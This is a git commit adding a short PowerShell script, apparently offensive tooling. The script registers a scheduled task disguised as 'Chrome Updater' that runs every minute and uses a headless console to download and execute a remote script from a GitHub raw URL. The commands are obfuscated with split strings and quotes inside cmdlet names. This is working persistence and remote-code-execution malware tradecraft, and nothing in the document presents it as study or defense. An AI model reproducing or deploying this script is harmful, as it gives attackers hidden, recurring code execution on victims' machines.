83afb3c9977d57916206e11581a66f1d8d3be8a9
4ndrz3j <70114673+4ndrz3j@users.noreply.github.com>
2024-01-17 21:13:55 +0100

    Add files via upload

---
+++ b.ps1
@@ -0,0 +1,4 @@
+﻿# C:\Windows\System32\conhost.exe --headless powershell -c "$l='http'+'s://raw.githubusercontent.com/4ndrz3j/test-repo/main/c.ps1';(i''wR $l).content|i''E''x"
+$Action = New-ScheduledTaskAction -Execute "C:\Windows\System32\conhost.exe" -Argument "--headless powershell -c `"`$l='http'+'s://raw.githubusercontent.com/4ndrz3j/test-repo/main/c.ps1';(i''wR `$l).content|i''E''x`""
+$Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 1)
+Register-ScheduledTask -Action $Action -Trigger $Trigger -TaskName "Chrome Updater"
